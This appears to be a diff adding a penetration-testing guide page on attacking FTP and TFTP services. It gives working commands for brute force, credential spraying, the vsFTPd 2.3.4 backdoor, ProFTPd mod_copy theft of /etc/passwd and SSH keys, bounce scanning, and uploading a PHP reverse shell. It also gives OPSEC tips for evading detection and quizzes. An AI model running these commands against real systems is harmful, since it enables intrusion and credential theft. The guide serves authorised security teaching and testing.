@@ -1,0 +1,629 @@
+---
+title: "FTP/TFTP - Port 21-20,69"
+description: "FTP/TFTP - Port 21-20,69"
+openGraph:
+  title: "FTP/TFTP - Port 21-20,69"
+  description: "FTP/TFTP - Port 21-20,69"
+---
+
+import { Callout } from 'nextra/components'
+
+
+## Cheatsheet
+
+```bash
+# Banner grab
+nc -nv <IP> 21
+
+#default scan 
+nmap -sV -sC -p21 <IP>
+
+# Nmap all FTP related scripts
+nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor,ftp-features,ftp-brute -p21 <IP>
+
+# Enumerate FTP server features (FEAT command)
+nmap -p21 --script ftp-features <IP>
+
+# Anonymous login (manual)
+ftp <IP> # Username: anonymous | Password: (empty or anonymous)
+
+# Anonymous login (netexec)
+nxc ftp <IP> -u 'anonymous' -p '' OR nxc ftp <IP> -u 'anonymous' -p 'anonymous'
+
+# Connect with lftp (enhanced FTP client)
+lftp <IP>
+
+# Browser access 
+# ftp://<USER>:<PASS>@<IP>
+
+# Check single credentials
+nxc ftp <IP> -u <USER> -p <PASS>
+
+# Credential spray from files
+nxc ftp <IP> -u users.txt -p passwords.txt
+
+# Hydra brute force
+hydra -l <USER> -P /usr/share/wordlists/rockyou.txt -t 4 ftp://<IP>
+hydra -L users.txt -P passwords.txt -t 4 ftp://<IP>
+
+# Nmap brute force
+nmap -p21 --script ftp-brute <IP>
+
+# Recursive download
+wget -m --no-passive ftp://<USER>:<PASS>@user:pass@<IP>:<PORT>
+
+# Mirror with lftp (handles special chars in passwords)
+lftp -u <USER>,<PASS> -e "mirror -c / /local/path; quit" ftp://<IP>
+
+# SSL/TLS FTP connection
+openssl s_client -connect <IP>:21 -starttls ftp
+
+# Upload a file
+ftp <IP>
+# ftp> binary
+# ftp> put <FILE>
+
+# FTP bounce : port scan internal hosts through FTP
+nmap -Pn -b <FTP_USER>@<IP> <INTERNAL_TARGET>
+
+# TFTP no auth, UDP port 69
+nmap -sU -p69 <IP>
+tftp <IP>
+# tftp> get <FILE>
+# tftp> put <FILE>
+```
+
+## Methodology
+
+### Phase 1: Fingerprint
+
+- [ ] `nc -nv <IP> 21` : grab banner, note exact server name and version (vsFTPd, ProFTPd, Pure-FTPd, FileZilla, IIS FTP).
+- [ ] `nmap -sV -sC -p21 <IP>` : run default NSE scripts.
+- [ ] `nmap -p21 --script ftp-features <IP>` sends the `FEAT` command to enumerate server capabilities (AUTH TLS, UTF8, MLST, SITE commands, etc.). Knowing which features are enabled tells you what the server supports `AUTH TLS` means encrypted connections are possible, `SITE EXEC` could mean command execution, and supported `SITE` commands may include `CPFR`/`CPTO` (mod_copy).
+- [ ] Google the exact version string search `<server> <version> exploit` on Google, Exploit-DB, searchsploit.
+- [ ] `searchsploit <server> <version>` check local Exploit-DB for known CVEs.
+
+<Quiz
+  question="You grab the FTP banner: '220 (vsFTPd 3.0.3)'. No CVEs come up in searchsploit. What's your next move?"
+  options={[
+    "Mark FTP as unexploitable and move to the next service",
+    "Test anonymous access, a clean CVE record doesn't mean the service is secure",
+    "Run Hydra immediately since the version is confirmed and there's no patch to worry about",
+    "Check if port 6200 is open, vsFTPd 3.x has a known backdoor"
+  ]}
+  answer={1}
+  explanation="Version fingerprinting tells you about known CVEs, not about misconfigurations. vsFTPd 3.0.3 has no public RCE, but anonymous access, writable directories, and credential reuse are all version-independent attack vectors. Never stop at the version check follow the full methodology. Port 6200 is specific to the vsFTPd 2.3.4 backdoor, not 3.x."
+/>
+
+### Phase 2: Anonymous / Null Access
+
+- [ ] `ftp <IP>` try `anonymous` / (empty password), `anonymous` / `anonymous`, `ftp` / `ftp`. 
+- [ ] If anonymous works: `ls -la` list everything including hidden files. Hidden files (dotfiles like `.htpasswd`, `.bash_history`, `.ssh/`) are where the gold is admins forget these exist in FTP-accessible directories.
+- [ ] `cd` into every directory enumerate the full directory tree. Don't just check the root sensitive files are often nested several levels deep in backup, config, or user directories.
+- [ ] `get <FILE>` or `mget *` download everything. Prioritize: 
+    - config files (database creds, API keys)
+    - backups (`.tar.gz`, `.zip`, `.bak`) 
+    - scripts (may contain hardcoded passwords)
+    - `.htpasswd` files (crackable hashes)
+    - web roots (`index.php`, `wp-config.php`).
+- [ ] `put test.txt` test write permissions. If the server accepts the upload, you've confirmed write access. 
+- [ ] Check if FTP root maps to a web server root (`/var/www/html`, `C:\inetpub\wwwroot`).
+    - **writable FTP + web root = RCE**.
+
+<Quiz
+  question="Anonymous FTP login succeeds and you confirm write access. Apache is running on port 80. What do you check before uploading a shell?"
+  options={[
+    "Upload shell.php immediately write access + web server = RCE",
+    "Run Hydra to find a privileged account before touching write access",
+    "Confirm whether the FTP root maps to the Apache document root",
+    "Download all files first, write access can wait"
+  ]}
+  answer={2}
+  explanation="Write access alone isn't RCE the FTP directory must overlap with a web-accessible path that executes PHP. Check anon_root in /etc/vsftpd.conf, or upload a benign test.txt and probe http://<IP>/test.txt. If it's accessible, the roots overlap. Uploading a shell before confirming this wastes time and creates noise. Downloading first is good practice but doesn't answer the RCE question."
+/>
+
+### Phase 3: Default Credentials
+
+- [ ] Try common defaults: `admin:admin`, `admin:password`, `root:root`, `ftpuser:ftpuser`, `user:user`, `test:test`.
+- [ ] Check if FTP users are system users on Linux, FTP often authenticates against `/etc/passwd`. Usernames found via SMTP VRFY, `/etc/passwd` dumps, LDAP queries, or RID cycling may work here with common or reused passwords.
+- [ ] Spray credentials harvested from other services against FTP. Credential reuse is the single most common way into FTP a database password from a config file, an SNMP community string, or an LDAP bind credential may work as an FTP login.
+
+### Phase 4: Misconfiguration Checks
+
+- [ ] `nmap --script ftp-bounce -p21 <IP>` test FTP bounce attack. The FTP `PORT` command tells the server where to send data if it accepts arbitrary addresses, you can use the server as a proxy to scan internal networks or bypass firewall rules.
+- [ ] `nmap --script ftp-vsftpd-backdoor -p21 <IP>` vsFTPd 2.3.4 backdoor check. Sending a username ending with `:)` opens a bind shell on port 6200. This is a specific check for one version, but it takes seconds and the payoff is instant root.
+- [ ] Check for ProFTPd mod_copy `SITE CPFR /etc/passwd` then `SITE CPTO /var/www/html/passwd` (unauthenticated file copy). The `mod_copy` module allows any connected user (even unauthenticated) to copy files anywhere on the filesystem that the FTP process can reach. If the FTP daemon runs as root or has access to the web root.
+- [ ] `openssl s_client -connect <IP>:21 -starttls ftp` check for FTPS (FTP over TLS). Inspect the certificate for hostnames, email addresses, organization names, and internal domain info. Certificates often leak info that isn't available through any other service.
+- [ ] `debug` / `status` / `trace` commands inside FTP session these diagnostic commands may leak the server's internal configuration, installation paths, operating system, or module list. Not all servers support them though.
+- [ ] Check for TFTP on UDP 69: `nmap -sU -p69 <IP>` TFTP requires no authentication at all. If it's open, you can read/write files directly. Common on network devices (routers, switches, VoIP phones) where it's used for firmware updates and config backups.
+aka
+### Phase 5: Brute Force (Last Resort)
+
+- [ ] `hydra -l <USER> -P /usr/share/wordlists/rockyou.txt -t 4 ftp://<IP>` keep threads low (`-t 4`) to avoid triggering fail2ban or account lockout policies. 
+- [ ] `nmap -p21 --script ftp-brute <IP>` nmap-based brute force using its built-in credential lists. Useful as a quick check with common creds without setting up Hydra.
+- [ ] `nxc ftp <IP> -u users.txt -p passwords.txt`  multi-user credential stuffing. Netexec handles the spray pattern (user1:pass1, user1:pass2, etc.) automatically and provides clean output.
+- [ ] If locked out, wait or try from a different source IP. Some fail2ban configurations only ban the offending IP for a set duration (usually 10-30 minutes).
+
+<Callout type="error">
+**OPSEC:** FTP has no built-in encryption (unless FTPS). All credentials, commands, and file contents travel in cleartext. Anyone sniffing the network (including the SOC) can see everything. On a real engagement, prefer SFTP or FTPS if available.
+</Callout>
+
+### Phase 6: Post-Access Actions
+
+- [ ] Download everything: `wget -m --no-passive ftp://<USER>:<PASS>@<IP>`. The `-m` flag mirrors the entire directory tree recursively. Use `--no-passive` if passive mode fails (common when the server is behind NAT). Review every downloaded file credentials hide in config files, database dumps, scripts, `.env` files, and backup archives.
+- [ ] Search for credentials in downloaded files: `grep -ri 'password\|passwd\|secret\|key\|token\|credential' ./` cast a wide net across all downloaded content.
+- [ ] Spray any new credentials against all other services: SSH, SMB, WinRM, RDP, MySQL, MSSQL
+- [ ] If writable FTP + web root confirmed: upload a web shell for RCE (see PHP Reverse Shell via FTP below).
+- [ ] If FTP creds work for SSH: connect directly for a proper interactive shell.
+
+<Quiz
+  question="You mirror an FTP server and find wp-config.php containing MySQL credentials (DB_USER: wpuser, DB_PASSWORD: Gr3en#2024). What's your priority order?"
+  options={[
+    "Connect to MySQL on port 3306 and dump the wordpress database",
+    "Spray wpuser:Gr3en#2024 against SSH, SMB, WinRM, RDP, and MySQL simultaneously",
+    "Search the rest of the downloaded files for more credentials first",
+    "Try the password against the WordPress admin panel at /wp-admin"
+  ]}
+  answer={1}
+  explanation="Credential reuse is the highest-ROI action here. Yes, the database is the obvious target but service accounts are routinely reused across SSH, WinRM, and SMB in enterprise environments. Spray first across all services in parallel (nxc smb, nxc ssh, nxc winrm), then hit the database. Also check whether the password follows a pattern (Gr3en#2024 → Gr3en#2025, Bl3e#2024) for spraying against other users."
+/>
+
+
+## Overview
+
+FTP (File Transfer Protocol) is a standard network protocol for transferring files between hosts over TCP. It operates on a client-server model where the client initiates a connection to upload, download, or manage files and directories on a remote server. Default port: **21**.
+
+FTP supports two access modes:
+
+- **Anonymous access** :users log in with the username `anonymous` or `ftp` with any password (or no password). Intended for public file sharing, but frequently misconfigured to expose sensitive directories.
+- **Authenticated access** : requires a valid username and password. On Linux, FTP typically authenticates against system accounts (`/etc/passwd`)
+
+
+### How FTP Uses Two Channels
+
+Unlike most protocols that use a single TCP connection, FTP separates control and data into two distinct channels. This dual-channel architecture is what makes FTP tricky with firewalls and NAT and is also what enables the bounce attack.
+
+| Channel | Port | Purpose |
+|---------|------|---------|
+| Control | TCP 21 | Commands (`USER`, `PASS`, `LIST`, `RETR`, `STOR`) and server response codes |
+| Data | TCP 20 (active) or ephemeral (passive) | Actual file content and directory listings |
+
+**Active vs Passive mode:** In **active mode**, the client tells the server its IP and port via the `PORT` command, and the server initiates a data connection back to the client on that address. This often fails when the client is behind a firewall or NAT because the inbound connection gets blocked. In **passive mode**, the server opens a random high port and tells the client to connect to it via the `PASV` response the client initiates both connections, which works better through firewalls. If downloads fail, toggle between modes (`passive` command in the FTP session, `--no-passive` flag with wget).
+
+<Callout type="info">
+**FTPS vs SFTP they're completely different.** FTPS (FTP Secure) wraps the same FTP protocol in SSL/TLS encryption same commands, same dual-channel architecture, just encrypted. SFTP (SSH File Transfer Protocol) has nothing to do with FTP it's a file transfer subsystem built into SSH that runs over port 22.
+</Callout>
+
+
+## Quick Reference
+
+| Task | Command |
+|------|---------|
+| Connect (ftp) | `ftp <IP>` |
+| Connect (lftp enhanced client) | `lftp <IP>` |
+| Connect with port | `ftp <IP> <PORT>` |
+| Connect via browser | `ftp://<USER>:<PASS>@<IP>` |
+| Banner grab (netcat) | `nc -nv <IP> 21` |
+| Banner grab (telnet) | `telnet <IP> 21` |
+| SSL/TLS connection | `openssl s_client -connect <IP>:21 -starttls ftp` |
+| Nmap default scripts | `nmap -sV -sC -p21 <IP>` |
+| Anonymous check (nmap) | `nmap --script ftp-anon -p21 <IP>` |
+| Feature enumeration | `nmap -p21 --script ftp-features <IP>` |
+| Bounce attack check | `nmap --script ftp-bounce -p21 <IP>` |
+| Download everything | `wget -m --no-passive ftp://<USER>:<PASS>@<IP>` |
+| Recursive mirror (lftp) | `lftp -u <USER>,<PASS> -e "mirror -c / ./loot; quit" ftp://<IP>` |
+
+
+## Connection Methods
+
+### FTP Client
+
+```bash
+ftp <IP>
+ftp <IP> <PORT>
+```
+
+The standard `ftp` client is available on virtually every Linux and Windows system. The port argument is optional and defaults to 21.
+
+### lftp (Enhanced Client)
+
+```bash
+lftp <IP>
+lftp -u <USER>,<PASS> ftp://<IP>
+lftp -u <USER>,<PASS> -e "mirror -c / /local/path; quit" ftp://<IP>
+```
+
+`lftp` is a more capable FTP client that supports bookmarks, automatic mirroring, job control, and scripting. It handles special characters in passwords (e.g., `!`, `@`, `#`) far better than the standard `ftp` client, which often chokes on them. The `mirror -c` flag enables resumable downloads useful for large files over unstable connections.
+
+
+## FTP Session Commands
+
+Once connected to an FTP server, these are the commands you'll use most during enumeration and data exfiltration:
+
+| Command | Description |
+|---------|-------------|
+| `ls -la` | List all files including hidden (dotfiles). Some servers don't support `-la`, try `dir` instead. |
+| `dir` | List directory with verbose details (permissions, size, date). Server-dependent formatting. |
+| `cd <DIR>` | Change directory on the remote server. |
+| `lcd <DIR>` | Change directory on your local machine (controls where `get` saves files). |
+| `pwd` | Print current working directory on the server. Useful for confirming your path. |
+| `get <FILE>` | Download a single file. |
+| `mget *` | Download all files in the current directory. Run `prompt off` first to avoid per-file confirmation. |
+| `put <FILE>` | Upload a single file. Use this to test write permissions or drop a web shell. |
+| `mput *` | Upload multiple files. |
+| `binary` | Switch to binary transfer mode. **Critical** for non-text files ASCII mode corrupts executables, archives, and images. |
+| `ascii` | Switch to ASCII transfer mode. Only use for plain text files. |
+| `passive` | Toggle passive mode on/off. Switch if transfers hang or fail (usually a NAT/firewall issue). |
+| `prompt off` | Disable per-file confirmation for `mget`/`mput`. Always run this before bulk downloads. |
+| `debug` | Toggle debug output. May reveal internal server paths, module names, and OS info in the response. |
+| `status` | Show current session info transfer mode, connection type, server config details. |
+| `quit` | Exit the FTP session. |
+
+<Callout>
+Always run `binary` before transferring executables, archives, or images. ASCII mode translates line endings (LF ↔ CRLF), which silently corrupts binary files. A corrupted reverse shell binary will fail to execute on the target with no helpful error message  always `binary` first.
+</Callout>
+
+
+## NetExec (nxc)
+
+NetExec is the fastest way to check FTP credentials across multiple hosts. It replaces `crackmapexec` and handles FTP authentication testing with clean, parseable output.
+
+```bash
+# Anonymous login check
+nxc ftp <IP> -u 'anonymous' -p ''
+
+# Check single credentials
+nxc ftp <IP> -u <USER> -p <PASS>
+
+# Credential file spray tries every user/pass combination
+nxc ftp <IP> -u users.txt -p passwords.txt
+
+# Password spray one password against many users (avoids lockout)
+nxc ftp <IP> -u users.txt -p '<PASS>'
+
+# Subnet sweep find all FTP servers with anonymous access
+nxc ftp <SUBNET>/24 -u 'anonymous' -p ''
+```
+
+The subnet sweep is particularly valuable during internal assessments it identifies every FTP server on the network and immediately flags which ones allow anonymous access. Run this early in the engagement to build a target list.
+
+## Brute Force
+
+Brute forcing FTP involves systematically trying username/password combinations from wordlists until a valid login is found. FTP has no built-in rate limiting, protection depends entirely on external tools like fail2ban or PAM modules, which many servers don't configure.
+
+```bash
+# Hydra  single user, large password list
+hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<IP>
+
+# Hydra  multiple users and passwords
+hydra -L users.txt -P passwords.txt ftp://<IP>
+
+# Hydra  low threads + wait time to avoid fail2ban
+hydra -L users.txt -P passwords.txt -t 4 -w 5 ftp://<IP>
+
+# Nmap  ftp-brute script (quick check with default credential lists)
+nmap -p21 --script ftp-brute <IP>
+
+# Medusa  alternative brute forcer
+medusa -h <IP> -U users.txt -P passwords.txt -M ftp
+```
+
+<Callout type="error">
+**OPSEC:** FTP brute force is extremely noisy. Every failed login attempt generates a log entry (typically in `/var/log/vsftpd.log`, `/var/log/auth.log`, or Windows Event Log). Most production servers run fail2ban, which bans your IP after 3-5 failed attempts. Keep threads low (`-t 4`), add wait time between attempts (`-w 5`), and **always exhaust anonymous access, default creds, and credential reuse before resorting to brute force**. If you're banned, wait for the ban to expire (typically 10-30 minutes) or pivot through a different IP.
+</Callout>
+
+<Callout>
+Before brute forcing with rockyou.txt (14 million entries), try smaller targeted lists first: `/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`, `/usr/share/seclists/Passwords/Common-Credentials/top-100.txt`. A 100-entry list that hits in 2 seconds is better than a 14-million-entry list that takes 6 hours and gets you banned.
+</Callout>
+
+
+## Known Exploits
+
+### vsFTPd 2.3.4 Backdoor (CVE-2011-2523)
+
+In July 2011, an attacker compromised the vsFTPd master download site and injected a backdoor into the 2.3.4 source tarball. The backdoor is triggered by sending a username containing the `:)` (smiley face) sequence during login. When triggered, it opens a bind shell listening on **port 6200** that provides root access no password required.
+
+```bash
+# Detection  automated nmap script
+nmap --script ftp-vsftpd-backdoor -p21 <IP>
+
+# Manual exploitation
+nc <IP> 21
+USER backdoored:)
+PASS anything
+# Connection closes backdoor shell is now listening
+nc <IP> 6200
+# You now have a root shell
+```
+
+The backdoor works by spawning `/bin/sh` as a new process bound to TCP 6200. The username just needs to contain `:)` anywhere  the characters before it don't matter. The password can be anything. If the connection on port 21 closes after the USER command but port 6200 opens, the backdoor is active.
+
+<Callout type="info">
+This affects **only** vsFTPd 2.3.4 downloaded from the compromised master site between June 30 and July 1, 2011. Package manager versions (apt, yum) were not affected. The backdoor is extremely common in CTFs and labs but rare in the wild. Always check anyway it takes seconds and the payoff is instant root.
+</Callout>
+
+### ProFTPd mod_copy : Unauthenticated File Copy
+
+The `mod_copy` module in ProFTPd (versions ≤ 1.3.5) implements `SITE CPFR` (copy from) and `SITE CPTO` (copy to) commands that allow **any connected user including unauthenticated users**  to copy files anywhere on the server's filesystem. The copy operation runs with the permissions of the FTP daemon process, which is often root.
+
+```bash
+# Connect without authenticating and copy /etc/passwd to web root
+nc <IP> 21
+SITE CPFR /etc/passwd
+350 File or directory exists, ready for destination name
+SITE CPTO /var/www/html/passwd.txt
+250 Copy successful
+# Now retrieve via HTTP: http://<IP>/passwd.txt
+
+# Copy SSH private key to accessible location
+SITE CPFR /home/<USER>/.ssh/id_rsa
+SITE CPTO /var/www/html/id_rsa
+```
+
+This is devastating because it requires zero authentication. The attacker connects to port 21 and immediately issues copy commands. If a web server is also running, you can copy any readable file to the web root and download it via HTTP. High-value targets: `/etc/shadow` (if FTP runs as root), SSH private keys, application config files with database credentials, and backup archives.
+
+<Callout>
+If there's no web server to exfiltrate through, try copying to other writable locations: `/tmp/`, TFTP root (`/var/lib/tftpboot/`), SMB shares, or NFS exports. Alternatively, copy a PHP web shell *into* the web root `SITE CPFR /path/to/uploaded/shell.php` → `SITE CPTO /var/www/html/shell.php`.
+</Callout>
+
+<Callout type="info">
+Patched in ProFTPd 1.3.5b and later. The fix restricts `SITE CPFR`/`CPTO` to authenticated users only. However, many systems run outdated ProFTPd versions always test.
+</Callout>
+
+### FTP Bounce Attack
+
+The FTP bounce attack exploits the `PORT` command, which tells the server where to send data. Normally, the server sends data back to the client. But if the server doesn't validate the target address, an attacker can instruct it to send data to **any host and port** effectively turning the FTP server into a proxy. This allows port scanning of internal networks, bypassing firewall rules, and masking the true source of an attack.
+
+```bash
+# Nmap detect if the server is vulnerable to bounce
+nmap --script ftp-bounce -p21 <IP>
+
+# Nmap use FTP server as proxy to port scan an internal target, fixed in most modern servers
+nmap -Pn -b <FTP_USER>@<IP> <INTERNAL_TARGET>
+```
+
+**Manual bounce execution:**
+
+```bash
+# Connect to the FTP server
+ftp <IP>
+
+# The PORT command format: IP as 4 comma-separated octets, then port as two bytes
+# To scan 192.168.1.100 port 80: PORT 192,168,1,100,0,80
+# Port calculation: port_hi * 256 + port_lo = target_port
+# Example: port 8080 = 31 * 256 + 144 → PORT 192,168,1,100,31,144
+quote PORT <TARGET_IP_COMMA_SEP>,<PORT_HI>,<PORT_LO>
+
+# Trigger a data transfer the server connects to the target
+get <FILE>
+# If the transfer succeeds, the target port is open
+# If it fails with "425 Can't build data connection", the port is closed
+```
+
+**Metasploit FTP bounce scanner:**
+
+```bash
+msfconsole -q
+use auxiliary/scanner/ftp/ftp_bounce
+set RHOSTS <FTP_IP>
+set RPORT 21
+run
+```
+
+The Metasploit module automates the bounce port scan  it uses the FTP server to probe a range of ports on the target and reports which ones are open. This is useful when you can't reach internal hosts directly but have access to an FTP server on the DMZ.
+
+<Callout type="info">
+FTP bounce is rare on modern servers most implementations now validate that the `PORT` command address matches the client's IP. But older servers, embedded devices, and misconfigured enterprise FTP servers may still be vulnerable. It takes seconds to test and can reveal entire internal networks that are otherwise invisible.
+</Callout>
+
+
+## PHP Reverse Shell via FTP + Web Server
+
+This is the classic FTP-to-RCE attack chain: if you can write files to an FTP directory that's also served by a web server capable of executing PHP, you can upload a reverse shell and trigger it via HTTP. Three conditions must be true:
+- **(1)** FTP write access
+- **(2)** FTP directory overlaps with web root
+- **(3)** web server executes PHP.
+
+```bash
+# 1. Download the PHP reverse shell payload
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
+```
+
+Edit `shell.php` and set your listener IP and port. These are the only two variables you need to change:
+
+```php
+$ip = '<LHOST>';   // Your attack machine IP
+$port = <LPORT>;   // Port your listener will be on
+```
+
+```bash
+# 2. Upload the shell via FTP
+ftp <IP>
+ftp> binary
+ftp> put shell.php
+ftp> quit
+
+# 3. Start a listener on your attack machine
+nc -lvnp <LPORT>
+
+# 4. Trigger the shell browse to the uploaded file
+# http://<IP>/shell.php
+# Or: curl http://<IP>/shell.php
+```
+
+When the web server processes `shell.php`, PHP executes the reverse shell payload, which connects back to your listener. You now have a shell running as the web server user (typically `www-data` on Linux or `IIS APPPOOL\DefaultAppPool` on Windows).
+
+<Callout type="error">
+**OPSEC:** The PHP shell file persists on disk after execution. Clean up immediately: `ftp> delete shell.php`. Web shells are detected by file integrity monitoring (AIDE, OSSEC), antivirus signatures, and web application firewalls. For stealth, consider a one-liner shell in a `.htaccess` override or a shell with a randomized filename and authentication gate.
+</Callout>
+
+<Callout>
+If you don't know whether the FTP directory maps to a web root, check the FTP server config files for path directives:
+
+- vsFTPd: `anon_root` or `local_root` in `/etc/vsftpd.conf`
+- ProFTPd: `DefaultRoot` in `/etc/proftpd/proftpd.conf`
+- IIS FTP: Check the IIS site bindings in `C:\Windows\System32\inetsrv\config\applicationHost.config`
+
+Common web roots: `/var/www/html`, `/var/www`, `/srv/http`, `C:\inetpub\wwwroot`, `C:\xampp\htdocs`.
+</Callout>
+
+<Quiz
+  question="FTP write access confirmed. You browse to http://<IP>/test.txt and it downloads Apache is serving the FTP root. You upload shell.php but curling it returns the raw PHP source instead of executing. What's the most likely cause?"
+  options={[
+    "The file didn't upload correctly retry with binary mode",
+    "PHP is not installed or not enabled in the Apache configuration for this directory",
+    "The shell.php filename is blocked by a WAF try shell.phtml",
+    "Apache requires a .htaccess file to enable PHP execution"
+  ]}
+  answer={1}
+  explanation="If Apache serves the file but doesn't execute it, PHP is either not installed or not enabled for that virtual host/directory. Check if the server runs a different stack if it returns .aspx pages elsewhere, upload an .aspx shell instead. A .htaccess AddType directive could re-enable PHP execution if .htaccess is allowed, but the root cause is still missing PHP support. The filename isn't the issue here Apache serves what it can't execute."
+/>
+
+<Callout type="info">
+**The web server runs ASP.NET instead of PHP. Can you still get RCE through FTP?**
+
+- Yes, upload an `.aspx` web shell instead (e.g., from `/usr/share/webshells/aspx/`). The principle is identical: writable FTP + web root + server-side execution = RCE. Match the shell language to the web stack.
+- If no server-side execution is available (static HTML server), this attack chain doesn't work,but you can still upload phishing pages, deface content, or plant files for other exploitation paths.
+</Callout>
+
+---
+
+## TFTP : UDP Port 69
+
+TFTP (Trivial File Transfer Protocol) is a stripped-down file transfer protocol that sacrifices every security feature for simplicity. It has **no authentication**, **no encryption**, **no directory listing**, and runs over **UDP** instead of TCP. TFTP was designed for bootstrapping diskless workstations (PXE boot) and firmware updates on embedded devices scenarios where simplicity matters more than security.
+
+From a pentest perspective, an open TFTP port is a direct read/write interface to the filesystem with zero access control. The only obstacle is that you must know (or guess) filenames there's no `ls` command.
+
+```bash
+# Scan for TFTP
+nmap -sU -p69 <IP>
+
+# Connect and transfer files
+tftp <IP>
+tftp> get <FILE>
+tftp> put <FILE>
+tftp> quit
+```
+
+| Limitation | Detail |
+|-----------|--------|
+| No authentication | Anyone can read/write if the service is running |
+| No directory listing | You must know or guess the filename |
+| UDP only | No connection state unreliable over lossy networks |
+| No encryption | All data in cleartext, easily sniffed |
+
+<Callout>
+TFTP is commonly used for PXE boot, firmware updates, and VoIP phone configs. If TFTP is open, try common filenames that often contain credentials in cleartext:
+
+- Network devices: `running-config`, `startup-config`, `backup-config`
+- VoIP: `phone.cfg`, `SIPDefault.cnf`, `SEP<MAC>.cnf.xml`
+- Boot: `pxelinux.0`, `boot.ini`, `grub.cfg`
+- Try this as well: https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/tftp.txt
+
+Network device configs pulled via TFTP frequently contain SNMP community strings, VPN pre-shared keys, VLAN configurations, and admin passwords in reversible encryption.
+</Callout>
+
+
+## vsFTPd Configuration Reference
+
+vsFTPd (Very Secure FTP Daemon) is the most common FTP server on Linux. Despite the name, its security depends entirely on configuration. The config file is highly readable and contains directives that directly map to attack vectors.
+
+**Config file:** `/etc/vsftpd.conf`
+**Blocked users:** `/etc/ftpusers` users listed here are **denied** FTP access (typically root, daemon, bin, etc.)
+
+### Dangerous Settings (Misconfigurations to Look For)
+
+| Setting | Risk |
+|---------|------|
+| `anonymous_enable=YES` | Anonymous login permitted immediate file access without credentials |
+| `anon_upload_enable=YES` | Anonymous users can upload files potential web shell drop |
+| `anon_mkdir_write_enable=YES` | Anonymous users can create directories aids in staging payloads |
+| `no_anon_password=YES` | No password prompt for anonymous  lowers the bar even further |
+| `write_enable=YES` | Write commands enabled globally (STOR, DELE, RNFR, MKD, RMD) |
+| `anon_root=/var/www/html` | Anonymous root maps to web server root  writable anonymous + this = instant RCE |
+| `local_enable=YES` | System users can log in via FTP  means FTP creds = SSH creds in most cases |
+| `chroot_local_user=NO` | Users are NOT jailed to their home directory  can traverse the entire filesystem |
+| `ls_recurse_enable=YES` | Recursive `ls` is allowed enables full directory tree enumeration in one command |
+| `hide_ids=NO` | File listings show real UID/GID instead of `ftp` reveals system usernames |
+| `pasv_min_port` / `pasv_max_port` | Defines the passive mode port range reveals firewall rules and port allocation |
+
+The most dangerous combination is `anonymous_enable=YES` + `anon_upload_enable=YES` + `anon_root=<web_root>`. This gives any unauthenticated user the ability to upload executable files directly into the web server's document root a trivial path to RCE.
+
+<Quiz
+  question="vsftpd.conf shows: anonymous_enable=YES, anon_upload_enable=YES, chroot_local_user=NO, local_enable=YES. Which setting is the most immediately dangerous and why?"
+  options={[
+    "local_enable=YES  system accounts can authenticate via FTP, meaning FTP credentials equal SSH credentials",
+    "anon_upload_enable=YES anonymous users can upload files, potentially leading to RCE if the FTP root overlaps with a web root",
+    "chroot_local_user=NO authenticated users can traverse the entire filesystem, not just their home directory",
+    "anonymous_enable=YES anonymous access is always the most dangerous setting regardless of context"
+  ]}
+  answer={1}
+  explanation="anon_upload_enable=YES is most immediately dangerous because it requires zero credentials and can lead directly to RCE if anon_root overlaps with a web root no authentication step needed. chroot_local_user=NO is severe but requires valid credentials first. local_enable=YES is high-value for lateral movement but again requires credentials. anonymous_enable=YES alone is only dangerous when combined with write permissions. The upload capability is what converts anonymous read access into a code execution path."
+/>
+
+<Callout>
+If `local_enable=YES` is set, FTP authenticates against system accounts. Try any usernames discovered through other enumeration (SMTP VRFY, RID cycling, LDAP, `/etc/passwd` from LFI) with common passwords like `password`, `<username>123`, `Welcome1`, `changeme`.
+</Callout>
+
+
+
+## Default Credentials
+
+These are credentials worth trying against any FTP server before resorting to brute force. Anonymous access is a feature, not a vulnerability but many servers are deployed with it enabled unintentionally.
+
+| Server | Username | Password |
+|--------|----------|----------|
+| Generic FTP | `anonymous` | (empty) |
+| Generic FTP | `anonymous` | `anonymous` |
+| Generic FTP | `ftp` | `ftp` |
+| vsFTPd | `anonymous` | (empty) |
+| FileZilla Server | `admin` | `admin` |
+| ProFTPd | `anonymous` | (empty) |
+| IIS FTP | `anonymous` | `anonymous` |
+| Cerberus FTP | `admin` | `admin` |
+| Xlight FTP | `admin` | (empty) |
+| WS_FTP | `admin` | `admin` |
+| Gene6 FTP | `admin` | (empty) |
+
+<Callout>
+If `local_enable=YES` is set, FTP authenticates against system accounts. Try any usernames discovered through other enumeration (SMTP VRFY, RID cycling, LDAP, `/etc/passwd` from LFI) with common passwords like `password`, `<username>123`, `Welcome1`, `changeme`.
+</Callout>
+
+
+
+## Attack Chains
+
+FTP rarely exists in isolation. Every finding on FTP is an input to the next phase of the attack. This table maps FTP discoveries to their most valuable follow-up actions:
+
+| FTP Finding | Next Step |
+|-------------|-----------|
+| Credentials in config files | Spray against SSH, SMB, WinRM, RDP, databases|
+| Writable directory + web root | Upload web shell → RCE |
+| SSH private key | `chmod 600 id_rsa && ssh -i id_rsa <USER>@<IP>` |
+| System user login works | Try same creds on SSH → proper interactive shell |
+| Database dump found | Extract creds |
+| Network device config (TFTP) | Extract SNMP community strings , VPN creds, VLAN info |
+| FTP bounce confirmed | Port scan internal hosts through FTP server  reveals otherwise unreachable targets |
+| ProFTPd mod_copy | Copy sensitive files to web root → exfiltrate via HTTP |
+| `.bash_history` or `.env` | Often contain plaintext passwords, API keys, or SSH connection strings |
+| WordPress `wp-config.php` | Database credentials → dump users table → crack hashes or spray creds |
+
+<Quiz
+  question="Your web shell upload gives you command execution as www-data on a Linux host. What's your first action?"
+  options={[
+    "Run sudo -l to check for quick privilege escalation wins",
+    "Execute a reverse shell payload to get a proper connection, then stabilize to a full TTY",
+    "Transfer and run LinPEAS for comprehensive privilege escalation enumeration",
+    "Read /etc/passwd to enumerate local users before doing anything else"
+  ]}
+  answer={1}
